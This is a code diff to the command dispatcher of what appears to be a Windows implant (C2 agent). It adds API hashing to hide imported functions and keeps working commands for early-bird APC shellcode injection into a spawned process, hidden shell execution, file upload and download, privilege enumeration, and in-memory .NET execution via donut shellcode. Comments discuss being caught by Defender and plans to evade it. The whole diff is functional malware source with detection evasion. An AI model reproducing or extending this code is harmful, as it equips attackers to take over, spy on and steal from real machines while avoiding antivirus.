@@ -3,6 +3,7 @@
 #include <Command.h>
 #include <Package.h>
 #include <Core.h>
+#include <Apihashing.h>
 
 #define Mana_COMMAND_LENGTH 11
 
@@ -36,7 +37,7 @@ VOID CommandDispatcher()
             return;
         }
 
-        Sleep( Instance.Config.Sleeping );
+        Api.Sleep( Instance.Config.Sleeping );
 
         Package = PackageCreate( COMMAND_GET_JOB );
 
@@ -75,7 +76,7 @@ VOID CommandDispatcher()
             } while ( Parser.Length > 4 );
 
             memset( DataBuffer, 0, DataSize );
-            LocalFree( *( PVOID* ) DataBuffer );
+            Api.LocalFree( *( PVOID* ) DataBuffer );
             DataBuffer = NULL;
 
             ParserDestroy( &Parser );
@@ -124,49 +125,49 @@ VOID CommandEbapc( PPARSER Parser )
     Si.cb = sizeof(Si);
     
     // Create suspended process
-    if ( !CreateProcessA( ProcessPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &Si, &Pi ) )
+    if ( !Api.CreateProcessA( ProcessPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &Si, &Pi ) )
     {
-        Offset += sprintf( Output + Offset, "[!] CreateProcessA failed: %d\r\n", GetLastError() );
+        Offset += sprintf( Output + Offset, "[!] CreateProcessA failed: %d\r\n", Api.GetLastError() );
     }
 
     Offset += sprintf( Output + Offset, "[+] Created process PID: %d\r\n", Pi.dwProcessId );
 
     // Allocate memory
-    ShellcodeAddress = VirtualAllocEx( Pi.hProcess, NULL, ShellSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
+    ShellcodeAddress = Api.VirtualAllocEx( Pi.hProcess, NULL, ShellSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
     if ( !ShellcodeAddress )
     {
-        Offset += sprintf( Output + Offset, "[!] VirtualAllocEx failed: %d\r\n", GetLastError() );
-        TerminateProcess( Pi.hProcess, 0 );
+        Offset += sprintf( Output + Offset, "[!] VirtualAllocEx failed: %d\r\n", Api.GetLastError() );
+        Api.TerminateProcess( Pi.hProcess, 0 );
     }
 
     // Write shellcode 
-    if ( !WriteProcessMemory( Pi.hProcess, ShellcodeAddress, Shellcode, ShellSize, NULL ) )
+    if ( !Api.WriteProcessMemory( Pi.hProcess, ShellcodeAddress, Shellcode, ShellSize, NULL ) )
     {
-        Offset += sprintf( Output + Offset, "[!] WriteProcessMemory failed: %d\r\n", GetLastError() );
-        TerminateProcess( Pi.hProcess, 0 );
+        Offset += sprintf( Output + Offset, "[!] WriteProcessMemory failed: %d\r\n", Api.GetLastError() );
+        Api.TerminateProcess( Pi.hProcess, 0 );
     }
 
     // Change protection to RX
-    if ( !VirtualProtectEx( Pi.hProcess, ShellcodeAddress, ShellSize, PAGE_EXECUTE_READWRITE, &dwOldProtection ) )
+    if ( !Api.VirtualProtectEx( Pi.hProcess, ShellcodeAddress, ShellSize, PAGE_EXECUTE_READWRITE, &dwOldProtection ) )
     {
-        Offset += sprintf( Output + Offset, "[!] VirtualProtectEx failed: %d\r\n", GetLastError() );
-        TerminateProcess( Pi.hProcess, 0 );
+        Offset += sprintf( Output + Offset, "[!] VirtualProtectEx failed: %d\r\n", Api.GetLastError() );
+        Api.TerminateProcess( Pi.hProcess, 0 );
     }
 
     // Queue APC
-    if ( !QueueUserAPC( (PAPCFUNC)ShellcodeAddress, Pi.hThread, 0 ) )
+    if ( !Api.QueueUserAPC( (PAPCFUNC)ShellcodeAddress, Pi.hThread, 0 ) )
     {
-        Offset += sprintf( Output + Offset, "[!] QueueUserAPC failed: %d\r\n", GetLastError() );
-        TerminateProcess( Pi.hProcess, 0 );
+        Offset += sprintf( Output + Offset, "[!] QueueUserAPC failed: %d\r\n", Api.GetLastError() );
+        Api.TerminateProcess( Pi.hProcess, 0 );
     }
 
     // Resume thread
-    ResumeThread( Pi.hThread );
+    Api.ResumeThread( Pi.hThread );
     Offset += sprintf( Output + Offset, "[+] Shellcode injected and executed!\r\n" );
 
     // Cleanup handles
-    CloseHandle( Pi.hProcess );
-    CloseHandle( Pi.hThread );
+    Api.CloseHandle( Pi.hProcess );
+    Api.CloseHandle( Pi.hThread );
 
     PackageAddBytes( Package, (PBYTE)Output, Offset );
     PackageTransmit( Package, NULL, NULL );
@@ -211,18 +212,18 @@ VOID CommandLs( PPARSER Parser )
         // If empty after trim, use current directory
         if ( strlen(TargetDir) == 0 )
         {
-            GetCurrentDirectoryA( MAX_PATH, TargetDir );
+            Api.GetCurrentDirectoryA( MAX_PATH, TargetDir );
         }
     }
     else
     {
         // No args, use current directory
-        GetCurrentDirectoryA( MAX_PATH, TargetDir );
+        Api.GetCurrentDirectoryA( MAX_PATH, TargetDir );
     }
 
 
     // Get full path for display for output
-    GetFullPathNameA( TargetDir, MAX_PATH, FullPath, NULL );
+    Api.GetFullPathNameA( TargetDir, MAX_PATH, FullPath, NULL );
     
     sprintf( SearchPath, "%s\\*", FullPath );
 
@@ -232,7 +233,7 @@ VOID CommandLs( PPARSER Parser )
     Offset += sprintf( Output + Offset, "------------  --------  ------------  ----------------------------------------\r\n" );
 
     // Find files
-    hFind = FindFirstFileA( SearchPath, &FindData );
+    hFind = Api.FindFirstFileA( SearchPath, &FindData );
     
     if ( hFind == INVALID_HANDLE_VALUE )
     {
@@ -242,8 +243,8 @@ VOID CommandLs( PPARSER Parser )
     do
     {
         // Convert file time to local time
-        FileTimeToLocalFileTime( &FindData.ftLastWriteTime, &LocalTime );
-        FileTimeToSystemTime( &LocalTime, &SysTime );
+        Api.FileTimeToLocalFileTime( &FindData.ftLastWriteTime, &LocalTime );
+        Api.FileTimeToSystemTime( &LocalTime, &SysTime );
 
         // Format date and time
         CHAR DateStr[16] = { 0 };
@@ -289,9 +290,9 @@ VOID CommandLs( PPARSER Parser )
         Offset += sprintf( Output + Offset, "%s  %s  %-12s  %s %s\r\n", DateStr, TimeStr, SizeStr, FindData.cFileName, Marker );
 
 
-    } while ( FindNextFileA( hFind, &FindData ) );
+    } while ( Api.FindNextFileA( hFind, &FindData ) );
 
-    FindClose( hFind );
+    Api.FindClose( hFind );
 
     // Shows the total file count with combined size, then directory count on the target directory
     Offset += sprintf( Output + Offset, "\r\n     %d File(s)  ", FileCount );
@@ -333,10 +334,10 @@ VOID CommandCd( PPARSER Parser )
     }
 
     // Attempt to change directory
-    if ( SetCurrentDirectoryA( Path ) )
+    if ( Api.SetCurrentDirectoryA( Path ) )
     {
         // Get and display new current directory
-        if ( GetCurrentDirectoryA( MAX_PATH, CurrentDir ) )
+        if ( Api.GetCurrentDirectoryA( MAX_PATH, CurrentDir ) )
         {
             Offset += sprintf( Output + Offset, "[+] Changed to: %s\r\n", CurrentDir );
         }
@@ -347,7 +348,7 @@ VOID CommandCd( PPARSER Parser )
     }
     else
     {
-        DWORD Error = GetLastError();
+        DWORD Error = Api.GetLastError();
         
         if ( Error == ERROR_FILE_NOT_FOUND || Error == ERROR_PATH_NOT_FOUND )
         {
@@ -381,7 +382,7 @@ VOID CommandPwd( PPARSER Parser )
     INT      Offset          = 0;
     CHAR     CurrentDir[MAX_PATH] = { 0 };
 
-    if ( GetCurrentDirectoryA( MAX_PATH, CurrentDir ) )
+    if ( Api.GetCurrentDirectoryA( MAX_PATH, CurrentDir ) )
     {
         Offset += sprintf( Output + Offset, "%s\r\n", CurrentDir );
     }
@@ -410,7 +411,7 @@ VOID CommandWhoami( PPARSER Parser ){
 
 
     // get current user
-    if (GetUserNameA(username, &username_len)) {
+    if (Api.GetUserNameA(username, &username_len)) {
         Offset += sprintf( Output + Offset, "[+] Current User: %s\r\n\r\n", username );
     }
     else {
@@ -418,14 +419,14 @@ VOID CommandWhoami( PPARSER Parser ){
     } 
 
     // get privilege information
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token))
+    if (!Api.OpenProcessToken(Api.GetCurrentProcess(), TOKEN_QUERY, &token))
         return;
 
-    GetTokenInformation(token, TokenPrivileges, NULL, 0, &size);
+    Api.GetTokenInformation(token, TokenPrivileges, NULL, 0, &size);
     privileges = (PTOKEN_PRIVILEGES)malloc(size);
 
-    if (!GetTokenInformation(token, TokenPrivileges, privileges, size, &size)) {
-        CloseHandle(token);
+    if (!Api.GetTokenInformation(token, TokenPrivileges, privileges, size, &size)) {
+        Api.CloseHandle(token);
         free(privileges);
         return;
     }
@@ -440,7 +441,7 @@ VOID CommandWhoami( PPARSER Parser ){
         DWORD privNameLen = sizeof(privName);
    
 
-        if (!LookupPrivilegeNameA(NULL, &privileges->Privileges[i].Luid, privName, &privNameLen))
+        if (!Api.LookupPrivilegeNameA(NULL, &privileges->Privileges[i].Luid, privName, &privNameLen))
             continue;
 
         BOOL enabled = (privileges->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED);
@@ -449,7 +450,7 @@ VOID CommandWhoami( PPARSER Parser ){
         DWORD displayNameSize = sizeof(displayName);
         DWORD languageId = 0;
 
-        BOOL result = LookupPrivilegeDisplayNameA(
+        BOOL result = Api.LookupPrivilegeDisplayNameA(
             NULL,
             privName,
             displayName,
@@ -467,7 +468,7 @@ VOID CommandWhoami( PPARSER Parser ){
     Offset += sprintf( Output + Offset, "\r\n[*] Total privileges: %lu\r\n", privileges->PrivilegeCount );
 
     free(privileges);
-    CloseHandle(token);
+    Api.CloseHandle(token);
 
     PackageAddBytes( Package, (PBYTE)Output, Offset );
     PackageTransmit( Package, NULL, NULL );
@@ -490,12 +491,12 @@ VOID CommandShell( PPARSER Parser )
 
     Command = ParserGetBytes( Parser, (PUINT32) &Length );
 
-    if ( CreatePipe( &hStdInPipeRead, &hStdInPipeWrite, &SecurityAttr, 0 ) == FALSE )
+    if ( Api.CreatePipe( &hStdInPipeRead, &hStdInPipeWrite, &SecurityAttr, 0 ) == FALSE )
     {
         return;
     }
 
-    if ( CreatePipe( &hStdOutPipeRead, &hStdOutPipeWrite, &SecurityAttr, 0 ) == FALSE )
+    if ( Api.CreatePipe( &hStdOutPipeRead, &hStdOutPipeWrite, &SecurityAttr, 0 ) == FALSE )
     {
         return;
     }
@@ -506,18 +507,18 @@ VOID CommandShell( PPARSER Parser )
     StartUpInfoA.hStdOutput = hStdOutPipeWrite;
     StartUpInfoA.hStdInput  = hStdInPipeRead;
 
-    if ( CreateProcessA( NULL, Command, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &StartUpInfoA, &ProcessInfo ) == FALSE )
+    if ( Api.CreateProcessA( NULL, Command, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &StartUpInfoA, &ProcessInfo ) == FALSE )
     {
         return;
     }
 
-    CloseHandle( hStdOutPipeWrite );
-    CloseHandle( hStdInPipeRead );
+    Api.CloseHandle( hStdOutPipeWrite );
+    Api.CloseHandle( hStdInPipeRead );
 
     AnonPipeRead( hStdOutPipeRead );
 
-    CloseHandle( hStdOutPipeRead );
-    CloseHandle( hStdInPipeWrite );
+    Api.CloseHandle( hStdOutPipeRead );
+    Api.CloseHandle( hStdInPipeWrite );
 }
 
 VOID CommandUpload( PPARSER Parser )
@@ -536,17 +537,17 @@ VOID CommandUpload( PPARSER Parser )
 
     printf( "FileName => %s (FileSize: %d)", FileName, FileSize );
 
-    hFile = CreateFileA( FileName, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL );
+    hFile = Api.CreateFileA( FileName, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL );
 
     if ( hFile == INVALID_HANDLE_VALUE )
     {
-        printf( "[*] CreateFileA: Failed[%ld]\n", GetLastError() );
+        printf( "[*] CreateFileA: Failed[%ld]\n", Api.GetLastError() );
         goto Cleanup;
     }
 
-    if ( ! WriteFile( hFile, Content, FileSize, &Written, NULL ) )
+    if ( ! Api.WriteFile( hFile, Content, FileSize, &Written, NULL ) )
     {
-        printf( "[*] WriteFile: Failed[%ld]\n", GetLastError() );
+        printf( "[*] WriteFile: Failed[%ld]\n", Api.GetLastError() );
         goto Cleanup;
     }
 
@@ -556,10 +557,11 @@ VOID CommandUpload( PPARSER Parser )
     PackageTransmit( Package, NULL, NULL );
 
 Cleanup:
-    CloseHandle( hFile );
+    Api.CloseHandle( hFile );
     hFile = NULL;
 }
 
+//have issue downloading a bit large files
 VOID CommandDownload( PPARSER Parser )
 {
     puts( "Command::Download" );
@@ -576,19 +578,19 @@ VOID CommandDownload( PPARSER Parser )
 
     printf( "FileName => %s", FileName );
 
-    hFile = CreateFileA( FileName, GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0 );
+    hFile = Api.CreateFileA( FileName, GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0 );
     if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) )
     {
-        printf( "[*] CreateFileA: Failed[%ld]\n", GetLastError() );
+        printf( "[*] CreateFileA: Failed[%ld]\n", Api.GetLastError() );
         goto CleanupDownload;
     }
 
-    FileSize = GetFileSize( hFile, 0 );
-    Content  = LocalAlloc( LPTR, FileSize );
+    FileSize = Api.GetFileSize( hFile, 0 );
+    Content  = Api.LocalAlloc( LPTR, FileSize );
 
-    if ( ! ReadFile( hFile, Content, FileSize, &Read, NULL ) )
+    if ( ! Api.ReadFile( hFile, Content, FileSize, &Read, NULL ) )
     {
-        printf( "[*] ReadFile: Failed[%ld]\n", GetLastError() );
+        printf( "[*] ReadFile: Failed[%ld]\n", Api.GetLastError() );
         goto CleanupDownload;
     }
 
@@ -600,14 +602,14 @@ VOID CommandDownload( PPARSER Parser )
 CleanupDownload:
     if ( hFile )
     {
-        CloseHandle( hFile );
+        Api.CloseHandle( hFile );
         hFile = NULL;
     }
 
     if ( Content )
     {
         memset( Content, 0, FileSize );
-        LocalFree( Content );
+        Api.LocalFree( Content );
         Content = NULL;
     }
 
@@ -615,6 +617,11 @@ CleanupDownload:
 
 //execute .net on a remote process by utilizing donut shellcode.
 //spawn msiexec by default, edit the agent.py to change the target process
+//detected by defender, even with a modified .NET payload that works when executed separately and effectively bypass defender.
+// It's probably because of how donut converts the .NET into a shellcode which is why it's detected.
+//Just added this as I want to have it a way to execute .NET applications in another application
+//A work around might be added in the future. Another development in progress is 
+// inlineExecuteAssembly which executes .NET in the same process which this time will not use donut.
 VOID CommandExecuteAssembly(PPARSER Parser)
 {
     PPACKAGE            Package         = PackageCreate(COMMAND_OUTPUT);
@@ -662,14 +669,14 @@ VOID CommandExecuteAssembly(PPARSER Parser)
     Sa.bInheritHandle       = TRUE;
     Sa.lpSecurityDescriptor = NULL;
 
-    if (!CreatePipe(&hPipeRead, &hPipeWrite, &Sa, 0))
+    if (!Api.CreatePipe(&hPipeRead, &hPipeWrite, &Sa, 0))
     {
-        Offset += sprintf(Output + Offset, "[!] CreatePipe failed: %lu\r\n", GetLastError());
+        Offset += sprintf(Output + Offset, "[!] CreatePipe failed: %lu\r\n", Api.GetLastError());
         goto Send;
     }
 
     // Ensure read handle is not inherited
-    SetHandleInformation(hPipeRead, HANDLE_FLAG_INHERIT, 0);
+    Api.SetHandleInformation(hPipeRead, HANDLE_FLAG_INHERIT, 0);
 
     // Setup startup info with redirected stdout/stderr
     Si.cb          = sizeof(STARTUPINFOA);
@@ -680,7 +687,7 @@ VOID CommandExecuteAssembly(PPARSER Parser)
     Si.hStdInput   = NULL;
 
     // Create suspended process with redirected output
-    if (!CreateProcessA(
+    if (!Api.CreateProcessA(
             SpawnPath,
             NULL,
             NULL,
@@ -692,48 +699,48 @@ VOID CommandExecuteAssembly(PPARSER Parser)
             &Si,
             &Pi))
     {
-        Offset += sprintf(Output + Offset, "[!] CreateProcessA failed: %lu\r\n", GetLastError());
+        Offset += sprintf(Output + Offset, "[!] CreateProcessA failed: %lu\r\n", Api.GetLastError());
         goto Cleanup;
     }
 
     // Allocate memory in target process
-    pRemote = VirtualAllocEx(Pi.hProcess, NULL, ShellcodeSize,
+    pRemote = Api.VirtualAllocEx(Pi.hProcess, NULL, ShellcodeSize,
                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!pRemote)
     {
-        Offset += sprintf(Output + Offset, "[!] VirtualAllocEx failed: %lu\r\n", GetLastError());
-        TerminateProcess(Pi.hProcess, 0);
+        Offset += sprintf(Output + Offset, "[!] VirtualAllocEx failed: %lu\r\n", Api.GetLastError());
+        Api.TerminateProcess(Pi.hProcess, 0);
         goto Cleanup;
     }
 
     // Write shellcode
-    if (!WriteProcessMemory(Pi.hProcess, pRemote, Shellcode, ShellcodeSize, NULL))
+    if (!Api.WriteProcessMemory(Pi.hProcess, pRemote, Shellcode, ShellcodeSize, NULL))
     {
-        Offset += sprintf(Output + Offset, "[!] WriteProcessMemory failed: %lu\r\n", GetLastError());
-        TerminateProcess(Pi.hProcess, 0);
+        Offset += sprintf(Output + Offset, "[!] WriteProcessMemory failed: %lu\r\n", Api.GetLastError());
+        Api.TerminateProcess(Pi.hProcess, 0);
         goto Cleanup;
     }
 
     // Make executable
-    VirtualProtectEx(Pi.hProcess, pRemote, ShellcodeSize, PAGE_EXECUTE_READ, &OldProtect);
+    Api.VirtualProtectEx(Pi.hProcess, pRemote, ShellcodeSize, PAGE_EXECUTE_READ, &OldProtect);
 
     // Queue APC and resume
-    QueueUserAPC((PAPCFUNC)pRemote, Pi.hThread, 0);
-    ResumeThread(Pi.hThread);
+    Api.QueueUserAPC((PAPCFUNC)pRemote, Pi.hThread, 0);
+    Api.ResumeThread(Pi.hThread);
 
     // Close write end of pipe (so ReadFile will return when process exits)
-    CloseHandle(hPipeWrite);
+    Api.CloseHandle(hPipeWrite);
     hPipeWrite = NULL;
 
     // Wait for process to complete (with timeout)
-    WaitForSingleObject(Pi.hProcess, 60000);  // 60 second timeout
+    Api.WaitForSingleObject(Pi.hProcess, 60000);  // 60 second timeout
 
     // Read all available output from pipe
     TotalRead = 0;
     while (TRUE)
     {
         // Check if data available
-        if (!PeekNamedPipe(hPipeRead, NULL, 0, NULL, &BytesAvailable, NULL))
+        if (!Api.PeekNamedPipe(hPipeRead, NULL, 0, NULL, &BytesAvailable, NULL))
             break;
 
         if (BytesAvailable == 0)
@@ -747,7 +754,7 @@ VOID CommandExecuteAssembly(PPARSER Parser)
         if (ToRead == 0)
             break;
 
-        if (!ReadFile(hPipeRead, PipeBuffer + TotalRead, ToRead, &BytesRead, NULL))
+        if (!Api.ReadFile(hPipeRead, PipeBuffer + TotalRead, ToRead, &BytesRead, NULL))
             break;
 
         TotalRead += BytesRead;
@@ -784,12 +791,12 @@ Cleanup:
     if (Pi.hProcess)
     {
         Offset += sprintf(Output + Offset, "[!] Terminating spawned process\r\n");
-        TerminateProcess(Pi.hProcess, 0);
+        Api.TerminateProcess(Pi.hProcess, 0);
     }
-    if (hPipeRead)   CloseHandle(hPipeRead);
-    if (hPipeWrite)  CloseHandle(hPipeWrite);
-    if (Pi.hThread)  CloseHandle(Pi.hThread);
-    if (Pi.hProcess) CloseHandle(Pi.hProcess);
+    if (hPipeRead)   Api.CloseHandle(hPipeRead);
+    if (hPipeWrite)  Api.CloseHandle(hPipeWrite);
+    if (Pi.hThread)  Api.CloseHandle(Pi.hThread);
+    if (Pi.hProcess) Api.CloseHandle(Pi.hProcess);
 
 Send:
     PackageAddBytes(Package, (PBYTE)Output, Offset);
@@ -803,5 +810,5 @@ VOID CommandExit( PPARSER Parser )
     
     PackageTransmit( Package, NULL, NULL );
 
-    ExitProcess( 0 );
+    Api.ExitProcess( 0 );
 }
